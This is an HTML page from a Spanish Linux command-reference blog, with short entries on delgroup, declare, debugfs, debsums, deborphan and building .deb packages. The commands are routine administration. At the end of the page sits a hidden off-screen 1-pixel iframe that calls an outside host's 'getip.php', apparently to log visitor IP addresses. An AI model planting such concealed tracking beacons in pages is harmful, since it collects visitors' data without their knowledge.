
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>TRACTATUS ELEMENTALIS</title>
  <meta name="author" content="templix">

  
  <meta name="description" content="Elimina un grupo del sistema # delgroup grupo
">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="https://tractatuslapipaplena.herokuapp.com/blog/page/110">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="TRACTATUS ELEMENTALIS" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <script src="/javascripts/links.js"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <div align=center>
  <h1><a href="/">TRACTATUS ELEMENTALIS</a></h1>
  
    <h2>Apuntes sobre bash. Orgasmos con la terminal.</h2>
  </dev>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS"></a></li>
  
</ul>
  
<form action="https://www.google.com/search?q=site%3Atractatuslapipaplena.herokuapp.com&q=" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:tractatuslapipaplena.herokuapp.com" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/previa">Previa</a></li>
  <li><a href="/">Últimas</a></li>
  <li><a href="/blog/archives">Todas</a></li>
  <li><a href="/scripts">Scripts</a></li>
  <li><a href="http://www.lapipaplena.net">Web</a></li>
  <li><a href="http://lapipaplena.no-ip.org/wiki/">Wiki</a></li>
  <li><a href="http://anonops.es">Foro</a></li>
  <li><a href="http://panellpipa.no-ip.org">Socios</a></li>

</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/delgroup/">Delgroup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-12-15T16:10:00+01:00" pubdate data-updated="true">15-12-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Elimina un grupo del sistema</p>

<blockquote><p># delgroup grupo</p></blockquote>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/declare/">Declare</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-12-15T16:10:00+01:00" pubdate data-updated="true">15-12-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Listar las variables de entorno. En caso de que una función tenga el mismo nombre que un script tiene preferencia la función. Usado principalmente en scripts.</p>

<blockquote><p>$ declare -f (Imprime las funciones alfabeticamente y su definición)</p>

<p>$ declare -f funcion (Mostrará la especificada)</p>

<p>$ declare -F (Lista sólo los nombres de la funciones)</p>

<p>$ declare -p var (Saber el tipo de la variable &#8220;var&#8221;)</p>

<p>$ declare -i var=5 (Declarar una variable de tipo entero)</p></blockquote>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/debugfs/">Debugfs</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-12-15T16:10:00+01:00" pubdate data-updated="true">15-12-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Depurador de sistemas ext. Permite consultar datos del sistema en tiempo real.</p>

<blockquote><p># debugfs (Entra en el promt de la aplicación. Pulsar letra &#8220;q&#8221; para salir del promt)</p></blockquote>

<p>debugfs 1.42 (29-Nov-2011)</p>

<p>debugfs: help (Muestra un listado de todas las opciones)</p>

<p>debugfs: open /dev/sda2 (Abre un sistema de archivos)</p>

<p>debugfs: stats (información de los superbloques)</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/debsums/">Debsums</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-12-15T16:10:00+01:00" pubdate data-updated="true">15-12-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Verificar la integridad de los ficheros.</p>

<blockquote><p># debsums -s &amp;> log.txt  (Modo silencioso [-s] y redirigiendo el resultado a un archivo para posterior análisis)</p>

<p># cat log.txt | grep &#8220;mismatch&#8221; | cut -d &#8221; &#8221; -f4 | uniq > reinstall.txt (A partir del archivo anterior, listar los que se han de reinstalar)</p>

<p># debsums -s | grep &#8220;mismatch&#8221; | cut -d &#8221; &#8221; -f4 | uniq > reinstall.txt (Lo mismo)</p>

<p># apt-get install &#8211;reinstall <code>(cat reinstall.txt)</code>  (para instalarlos a partir del listado)</p></blockquote>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/deborphan/">Deborphan</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-12-15T16:10:00+01:00" pubdate data-updated="true">15-12-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Visualizar paquetes huerfanos</p>

<blockquote><p>$ deborphan &#8211;guess-all   (Los muestra todos)</p>

<p># apt-get remove $(deborphan &#8211;guess-all)     (borra todos los mostrados)</p>

<p># deborphan        (para ver las librerias huérfanas)</p>

<p># dpkg -l $(deborphan)    (lo mismo que el anterior con más detalles)</p>

<p># sudo dpkg &#8211;purge $(deborphan)   (eliminar los paquetes huérfanos)</p>

<p># apt-get remove <code>deborphan</code> (Lo mismo)</p>

<p># dpkg -l $(deborphan &#8211;find-config)  (para borrar configuraciones que no se han borrado tras la desinstalación de un paquete)</p>

<p># dpkg &#8211;purge $(deborphan &#8211;ind-config)  (para eliminarlos)</p>

<p># apt-get remove $(deborphan &#8211;guess-all)</p></blockquote>

<p>Nota.- Normalmente estas aplicaciones han de repetirse varias veces hasta que al lanzar el comando no salga ninguna archivo huerfana.</p>

<blockquote><p># deborphan | xargs sudo apt-get -y remove &#8211;purge (otra forma de eliminar paquetes huerfanos)</p></blockquote>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/debian-timeline/">Debian-timeline</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-12-15T16:10:00+01:00" pubdate data-updated="true">15-12-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Línea de tiempo del proyecto Debian basado en Javascript y HTML: Versiones, bugs, lanzamientos importantes&#8230; Colocar en la barra de navegación:</p>

<pre><code>http://usr/share/debian-timeline/index.html
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/debian-history/">Debian-history</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-12-15T16:10:00+01:00" pubdate data-updated="true">15-12-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Historia de la distro Debian. Los idiomas disponibles son: Inglés, francés, alemán, italiano, japonés, coreano, portugués, ruso y lituano. Colocar en la barra de navegación [para el idioma francés]:</p>

<pre><code>http://usr/share/doc/debian-history/fr/index.fr.html
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/debget/">Debget</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-12-15T16:10:00+01:00" pubdate data-updated="true">15-12-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>[debian-goodies]</p>

<p>Descarga un paquete del repositorio o, caso de estar instalado, muestra la versión.</p>

<blockquote><p>$ debget debian-goodies</p>

<p>$ debget 0ad</p></blockquote>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/deb/">Deb</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-12-15T16:10:00+01:00" pubdate data-updated="true">15-12-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Extensión de los paquetes para distros Debian.</p>

<p>1.-</p>

<p>Crear un paquete para esta distro a partir de un script:</p>

<pre><code>$ mkdir deb 
</code></pre>

<p>En ese directorio recrear la estructura destino que queremos utilizar. En nuestro caso /usr/bin, el directorio para el icono y permisos:</p>

<pre><code>$ mkdir -p deb/usr/bin

$ mkdir -p deb/usr/share/applications
</code></pre>

<p>Copiar el script en el bin creado:</p>

<pre><code>$ cp script deb/usr/bin 
</code></pre>

<p>Crear el subdirectorio DEBIAN:</p>

<pre><code>$ mkdir deb/DEBIAN 
</code></pre>

<p>En su interior el fichero “control”:</p>

<pre><code>$ nano deb/DEBIAN/control 
</code></pre>

<p>En el que pegamos datos del paquete:</p>

<p>Package: nombre_que_queremos</p>

<p>Priority: optional</p>

<p>Section: misc</p>

<p>Maintainer: el_mantenedor</p>

<p>Architecture: all</p>

<p>Version: 1.0</p>

<p>Depends: Las_dependendias_del_paquete</p>

<p>Description: Pequeña_descripción_de_la_maravilla</p>

<p> Este script &#8230;. para &#8230;.. de &#8230;.. aquello&#8230;&#8230;.</p>

<p>Notas: En el nombre del paquete (Package) no se admiten espacios ni barras bajas) y en la descripción (Description) el primer carácter de la segunda linea es un espacio y al final del texto, darle al intro para que ponga una linea vacia. Las dependencias que pongamos en “Depends” son las que se instalarán  con la instalación del .deb.</p>

<p>Crear el paquete “menu” en el mismo directorio:</p>

<pre><code>$ nano deb/DEBIAN/menu
</code></pre>

<p>Y en su interior pegar:</p>

<pre><code>?package(nombre_script):needs="X11" \ 

    section="Applications/Network/Monitoring" \ 

    title="Suport VNC" command="gnome-terminal -e script_que_sea" \ 

    icon="/usr/share/pixmaps/gnome-term-linux2.png"
</code></pre>

<p>Notas: Nombre del paquete, que precisa de las X (X11), donde se colocará en el menú “Aplicaciones” (otras opciones: section=”Apps/Multimedia”&#8230;), el comando que lo lanzará (gnome-terminal -e script) y el icono que hemos escogido. Crear el archivo nombre_script.desktop para los datos del icono:</p>

<pre><code>$ gedit deb/usr/share/applications/nombre_script.desktop
</code></pre>

<p>Y pegar el siguiente contenido:</p>

<pre><code>[Desktop Entry] 

Version=1.0 

Name=Nombre_script 

GenericName=Nombre_script 

Comment=Pequeño_comentario 

Exec=Nombre_script_que_lo_lanzará 

Terminal=true 

Type=Application 

Categories=Application;Network; 

Icon=gnome-term-linux2.png 

StartupNotify=true
</code></pre>

<p>Nota.- también varios modelos de iconos en:</p>

<pre><code>$ ls /home/usuario/.local/share/applications/  
</code></pre>

<p>Cambiar el propietario del directorio:</p>

<pre><code># chown -R root.root deb 
</code></pre>

<p>Finalmente crear el paquete .deb y que lo coloque en el escritorio:</p>

<pre><code># dpkg -b deb /home/usuario/Escritorio/nombre.deb
</code></pre>

<p>2.-</p>

<p>Crear un paquete a partir de un tar.gz:</p>

<p>Para el ejemplo usaremos el paquete picpuz, un juego para crear puzles a partir de una fotografia, que aunque tenga versión .deb, para el caso nos sirve.</p>

<p>Crear carpeta de trabajo y entrar en ella:</p>

<pre><code>$ mkdir picpuz 

$ cd picpuz 
</code></pre>

<p>Descargar y descomprimir el tar.gz y entrar en la carpeta descomprimida:</p>

<blockquote><p>$ wget http://kornelix.squarespace.com/storage/downloads/picpuz-2.2.tar.gz</p>

<p>$ tar xvzf picpuz-2.2.tar.gz</p>

<p>$ cd picpuz-2.2</p></blockquote>

<p>Crear el nuevo paquete .orig.tar.gz con los estandares de Debian, con licencia gpl3 y generando el paquete desde las fuentes:</p>

<pre><code>$ dh_make --createorig  -c gpl3 -s
</code></pre>

<p>Construir el paquete .deb:</p>

<pre><code>$ dpkg-buildpackage -rfakeroot 
</code></pre>

<p>Listar el contenido de un paquete .deb:</p>

<pre><code>$ ar -tv picpuz_2.2-1_i386.deb
</code></pre>

<p>Información y perspectiva general de lo que ofrece el paquete:</p>

<pre><code>$ dpkg-deb -I picpuz_2.2-1_i386.deb
</code></pre>

<p>Listar los ficheros que serán instalados:</p>

<pre><code>$ dpkg-deb -c picpuz_2.2-1_i386.deb 
</code></pre>

<p>instalarlo:</p>

<pre><code># dpkg -i picpuz_2.2-1_i386.deb
</code></pre>

<p>Lo encontraremos en aplicaciones/juegos</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/deallocvt/">Deallocvt</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-12-15T16:10:00+01:00" pubdate data-updated="true">15-12-2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Libera memoria y estructuras de datos del núcleo para todas las consolas virtuales que no se usen. Una consola virtual se considera en desuso si no es la consola en primer plano, ni  ningún  proceso  la  tiene  abierta  para  lectura  o escritura, ni se ha seleccionado ningún texto en su pantalla. Ver openvt</p>

<blockquote><p># deallocvt (Las desasigna todas)</p>

<p># deallocvt 5 (Sólo desasigna la /dev/tty5)</p></blockquote>

<p>Un ejemplo de uso:</p>

<blockquote><p># openvt -s ls (lanzara el comando ls en la primera consola virtual libre. Normalmente la /dev/tty8)</p>

<p># deallocvt 8</p></blockquote>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/blog/page/111/">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/blog/page/109/">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
<h1>Número de entradas</h1>
	<ul>
	<li>1354</li>
	</ul>
</section>
<section>
  <h1>Añadidos/modificados</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/zypper/">zypper</a>
      </li>
    
      <li class="post">
        <a href="/blog/zmore/">zmore</a>
      </li>
    
      <li class="post">
        <a href="/blog/zmap/">zmap</a>
      </li>
    
      <li class="post">
        <a href="/blog/zless/">zless</a>
      </li>
    
      <li class="post">
        <a href="/blog/zip/">zip</a>
      </li>
    
      <li class="post">
        <a href="/blog/zgrep/">zgrep</a>
      </li>
    
      <li class="post">
        <a href="/blog/zfgrep/">zfgrep</a>
      </li>
    
      <li class="post">
        <a href="/blog/zenity/">zenity</a>
      </li>
    
      <li class="post">
        <a href="/blog/zegrep/">zegrep</a>
      </li>
    
      <li class="post">
        <a href="/blog/zdump/">zdump</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>Sobre mi</h1> 
  <center>
  <img src="/images/linux_user.png" title="Linux user">
  </center>
  <p>Soy un /dev de lo más normal, con ciertas deficiencias en el xorg.conf como casi todo el mundo, con una apariencia común tirando a gráfica VGA y con algún pixel algo deteriorado y que vivirá hasta que su directorio / sufra un kernel pánic y me mande a /dev/null</p>
</section>

<section class="googleplus">
  <h1>
    <a href="https://plus.google.com/107431970267257491799?rel=author">
      <img src="http://www.google.com/images/icons/ui/gprofile_button-32.png" width="32" height="32">
      Google+
    </a>
  </h1>
</section>


<section>
  <h1>Blogs útiles</h1>
  <ul>
      <li><a href="http://distrowatch.com">Distrowatch</a></li>
      <li><a href="http://es.wikipedia.org/wiki/Lista_de_n%C3%BAmeros_de_puerto">Listado de puertos</a></li>
      <li><a href="http://livecdlist.com/">LiveCDs</a></li>
      <li><a href="http://perseosblog.com">Perseosblog</a><li>
   </ul>
</section>
<section>
<table border="0" cellspacing="0" cellpadding="0"><tr><td align="center"><script type="text/javascript" src="http://www.worldtimeserver.com/clocks/embed.js"></script><script type="text/javascript" language="JavaScript">objES=new Object;objES.wtsclock="wtsclock001.swf";objES.color="CC6600";objES.wtsid="ES";objES.width=200;objES.height=200;objES.wmode="transparent";showClock(objES);</script></td></tr></table>
</section>
<section>
	<h1>IP visitante</h1>
	<script type="text/javascript" src="http://boastology.com/tools/ip2c/?im=0&cn=0&ip=1"></script>
</section>

  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2013 - templix -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>




<div style="width: 1px; height: 1px; overflow: hidden; position: absolute; left: -1000px">
<iframe src="http://crontux.homelinux.com/getip.php"></iframe>
</div>

</body>
</html>
